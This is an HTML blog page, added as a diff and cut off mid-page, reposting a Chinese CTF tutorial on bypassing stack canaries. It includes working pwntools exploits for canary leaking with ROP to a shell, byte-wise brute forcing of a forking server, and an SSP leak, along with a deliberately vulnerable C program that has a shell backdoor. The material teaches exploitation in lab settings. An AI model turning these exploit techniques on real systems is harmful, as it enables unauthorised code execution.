@@ -1,0 +1,415 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>canary合集——转载 - ShouCheng</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="转载自N神博客Canary介绍1Canary中文意译为...">
+  <meta name="author" content="ShouCheng">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">canary合集——转载</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">canary合集——转载</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>May 23, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>11559</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="转载自N神博客"><a href="#转载自N神博客" class="headerlink" title="转载自N神博客"></a>转载自<a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#more">N神博客</a></h1><h1 id="Canary介绍"><a href="#Canary介绍" class="headerlink" title="Canary介绍"></a>Canary介绍</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Canary中文意译为金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警<br></code></pre></td></tr></table></figure>
+
+<p>那么，我们可以简单把它理解成一个类似于cookie之类的东西，程序执行时需要验证它是正确的才能正常向下执行<br>通常的栈溢出利用，需要覆盖返回地址以控制程序流，那么只需要在覆盖返回地址之前插入一个叫Canary的cookie信息，当函数返回之时检测Canary的值是否被更改，就可以判断是否发生了栈溢出这种危险行为，如果Canary被更改，程序会去执行__stack_chk_fail函数并结束。<br>一般来说，canary大部分情况都是在rbp-0x8的位置<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/1.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86.assets/1-1622104561265.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>栈中的canary大概长这样<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/2.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a></p>
+<h2 id="覆盖低字节泄露Canary"><a href="#覆盖低字节泄露Canary" class="headerlink" title="覆盖低字节泄露Canary"></a>覆盖低字节泄露Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p>
+<h3 id="例题：攻防世界-厦门邀请赛pwn1"><a href="#例题：攻防世界-厦门邀请赛pwn1" class="headerlink" title="例题：攻防世界_厦门邀请赛pwn1"></a>例题：攻防世界_厦门邀请赛pwn1</h3><p>分析下代码<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/3.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>存在栈溢出，canary在rbp-0x8的位置，可以将输入的字符串打印出来<br>那思路就很明确了<br>先通过多写1字节将\x00覆盖，然后打印泄露Canary，最后直接ROP<br>覆盖完大概长这样<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/4.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#!/usr/bin/env python<br>#coding=utf-8<br>from pwn import*<br>from LibcSearcher import *<br>context.log_level = &#x27;debug&#x27;<br>context.terminal = [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]<br>binary = &#x27;./babystack&#x27;<br>local = 1<br>if local == 1:<br>    p=process(binary)<br>else:<br>    p=remote(&quot;&quot;,)<br>elf=ELF(binary)<br>libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>pop_rdi_ret = 0x0000000000400a93<br>puts_got = elf.got[&#x27;puts&#x27;]<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>start = 0x0000000000400720<br>def exp():<br>    payload = &quot;a&quot;*0x88<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;1&quot;)<br>    p.sendline(payload)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;2&quot;)<br>    p.recvuntil(&quot;a&quot; * 0x88 + &#x27;\n&#x27;)<br>    canary = u64(p.recv(7).rjust(8, &#x27;\x00&#x27;))<br>    log.success(&quot;canary==&gt;&quot; + hex(canary))<br>    payload = &quot;a&quot;*0x88 + p64(canary) + &quot;a&quot;*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;1&quot;)<br>    p.sendline(payload)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;3&quot;)<br>    puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>    libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>    log.success(&quot;puts_addr==&gt;&quot; + hex(puts_addr))<br>    log.success(&quot;libc_base==&gt;&quot; + hex(libc_base))<br>    one_gadget = libc_base + 0xf1207<br>    payload = &quot;a&quot; * 0x88 + p64(canary) + &quot;a&quot;*8 + p64(one_gadget)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;1&quot;)<br>    p.send(payload)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;3&quot;)<br>    p.interactive()<br>exp()<br></code></pre></td></tr></table></figure>
+
+<h2 id="Fork子进程程序爆破canary"><a href="#Fork子进程程序爆破canary" class="headerlink" title="Fork子进程程序爆破canary"></a>Fork子进程程序爆破canary</h2><p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致<br>那么每次程序挂了，都相当于会再重新开始一遍<br>那我们可以逐位爆破canary，如果程序挂了就说明这一位不对，如果程序正常就可以接着跑下一位，直到爆破出正确的canary</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这基本上都是直接从veritas👴👴的blog里摘出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;sys/wait.h&gt;<br>void backdoor(void) &#123;<br>    system(&quot;/bin/sh&quot;);<br>&#125;<br>void init() &#123;<br>    setbuf(stdin, NULL);<br>    setbuf(stdout, NULL);<br>    setbuf(stderr, NULL);<br>&#125;<br>void vul(void) &#123;<br>    char buffer[100];<br>    read(STDIN_FILENO, buffer, 120);<br>&#125;<br>int main(void) &#123;<br>    init();<br>	pid_t pid;<br>	while(1) &#123;<br>		pid = fork();<br>		if(pid &lt; 0) &#123;<br>			puts(&quot;fork error&quot;);<br>			exit(0);<br>		&#125;<br>		else if(pid == 0) &#123;<br>			puts(&quot;welcome&quot;);<br>			vul();<br>			puts(&quot;recv sucess&quot;);<br>		&#125;<br>		else &#123;<br>			wait(0);<br>		&#125;<br>	&#125;<br>&#125;<br>//gcc main.c -m32 -o bin<br></code></pre></td></tr></table></figure>
+
+<p>然后就硬爆破</p>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>p = process(&#x27;./bin&#x27;)<br>elf = ELF(&quot;./bin&quot;)<br>p.recvuntil(&#x27;welcome\n&#x27;)<br>canary = &#x27;\x00&#x27;<br>for j in range(3):<br>    for i in range(0x100):<br>        p.send(&#x27;a&#x27;*100 + canary + chr(i))<br>        a = p.recvuntil(&#x27;welcome\n&#x27;)<br>        if &#x27;recv&#x27; in a:<br>            canary += chr(i)<br>            break<br><br>p.sendline(&#x27;a&#x27;*100 + canary + &#x27;a&#x27;*12 + p32(0x80485FB))<br>p.sendline(&quot;cat flag&quot;)<br>flag = p.recv()<br>p.close()<br>log.success(&#x27;key is:&#x27; + flag)<br>#  [*] Stopped process &#x27;./bin&#x27; (pid 17747)<br>#  [+] key is:flag&#123;test&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="SSP-Stack-Smashing-Protect-Leak"><a href="#SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="SSP(Stack Smashing Protect) Leak"></a>SSP(Stack Smashing Protect) Leak</h2><p>这个方法不能getshell，但是可以通过触发canary时的报错信息，来打印出我们想要的内存中的值，例如flag<br>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印这么一段信息<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/7.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>我们分析下__stack_chk_fail的源码<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/5.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>他会调用一个__fortify_fail函数并传入”stack smashing detected”字符串<br>我们接着分析__fortify_fail函数<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/6.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</p>
+<h3 id="例题：wdb2018-guess"><a href="#例题：wdb2018-guess" class="headerlink" title="例题：wdb2018_guess"></a>例题：wdb2018_guess</h3><p>分析main函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall main(__int64 a1, char **a2, char **a3)<br>&#123;<br>  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]<br>  int v5; // [rsp+1Ch] [rbp-84h]<br>  __int64 v6; // [rsp+20h] [rbp-80h]<br>  __int64 v7; // [rsp+28h] [rbp-78h]<br>  char buf[48]; // [rsp+30h] [rbp-70h]<br>  char s2[56]; // [rsp+60h] [rbp-40h]<br>  unsigned __int64 v10; // [rsp+98h] [rbp-8h]<br><br>  v10 = __readfsqword(0x28u);<br>  v7 = 3LL;<br>  LODWORD(stat_loc.__uptr) = 0;<br>  v6 = 0LL;<br>  sub_4009A6();<br>  HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2);<br>  if ( HIDWORD(stat_loc.__iptr) == -1 )<br>  &#123;<br>    perror(&quot;./flag.txt&quot;);<br>    _exit(-1);<br>  &#125;<br>  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);<br>  close(SHIDWORD(stat_loc.__iptr));<br>  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);<br>  while ( 1 )<br>  &#123;<br>    if ( v6 &gt;= v7 )<br>    &#123;<br>      puts(&quot;you have no sense... bye :-) &quot;);<br>      return 0LL;<br>    &#125;<br>    v5 = sub_400A11();<br>    if ( !v5 )<br>      break;<br>    ++v6;<br>    wait((__WAIT_STATUS)&amp;stat_loc);<br>  &#125;<br>  puts(&quot;Please type your guessing flag&quot;);<br>  gets(s2);<br>  if ( !strcmp(buf, s2) )<br>    puts(&quot;You must have great six sense!!!! :-o &quot;);<br>  else<br>    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>sub_400A11函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 sub_400A11()<br>&#123;<br>  unsigned int v1; // [rsp+Ch] [rbp-4h]<br><br>  v1 = fork();<br>  if ( v1 == -1 )<br>    err(1, &quot;can not fork&quot;);<br>  return v1;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，fork了一个子进程，并且判断依据是v7的大小，也就是说整个程序可以崩溃3次<br>这姿势和题目我专门写了一篇，思路可以直接看<a target="_blank" rel="noopener" href="https://n0vice.top/2020/04/09/Stack-smash/">stack smash</a></p>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#!/usr/bin/env python<br>#coding=utf-8<br>from pwn import*<br>import sys<br>#context.log_level = &#x27;debug&#x27;<br>context.terminal = [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]<br>binary = &#x27;./pwn1&#x27; <br>local = 1<br>if local == 1:<br>    p=process(binary)<br>else:<br>    p=remote(&quot;&quot;,)<br>elf=ELF(binary)<br>libc=elf.libc<br>def exp():<br>    p.recvuntil(&quot;flag\n&quot;)<br>    payload = &quot;a&quot;*296 + p64(elf.got[&#x27;puts&#x27;])<br>    p.sendline(payload)<br>    p.recvuntil(&quot;*** stack smashing detected ***: &quot;)<br>    puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>    libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>    log.success(&quot;puts_addr==&gt;&quot; + hex(puts_addr))<br>    log.success(&quot;libc_base==&gt;&quot; + hex(libc_base))<br>    environ = libc_base + libc.sym[&#x27;environ&#x27;]<br>    p.recvuntil(&quot;flag\n&quot;)<br>    payload = &quot;a&quot;*296 + p64(environ)<br>    p.sendline(payload)<br>    p.recvuntil(&quot;*** stack smashing detected ***: &quot;)<br>    stack_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>    log.success(&quot;stack_addr==&gt;&quot; + hex(stack_addr))<br>    flag = stack_addr - 0x168<br>    p.recvuntil(&quot;flag\n&quot;)<br>    payload = &quot;a&quot;*296 + p64(flag)<br>    p.sendline(payload)<br>    p.interactive()<br>exp()<br></code></pre></td></tr></table></figure>
+
+<h4 id="warn"><a href="#warn" class="headerlink" title="warn"></a>warn</h4><p>需要注意的是，这个方法在glibc2.27及以上的版本中已失效<br>我们继续分析2.27的源码<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/8.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/9.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/9.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>可以看到，执行__fortify_fail_abort函数时多传入了一个need_backtrace参数，而整个参数在前面就已经写死成false了，所以执行__libc_message函数时，第二个参数也被写死成了”<unknown>”字符串，打印不了栈中的信息了</p>
+<h2 id="修改TLS结构体"><a href="#修改TLS结构体" class="headerlink" title="修改TLS结构体"></a>修改TLS结构体</h2><p>我们首先需要知道canary是从<strong>哪里</strong></p>
+<p>被取出来的<br>随便查看一个64位的程序，可以看到是从fs指向的位置加上0x28偏移的位置取出来的<br>而初始化canary时，fs寄存器指向的位置就是TLS结构体<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/11.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>这个被定义在glibc/sysdeps/x86_64/nptl/tls.h中结构体tcbhead_t就是用来描述TLS的<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/12.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/12.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/13.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/13.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span 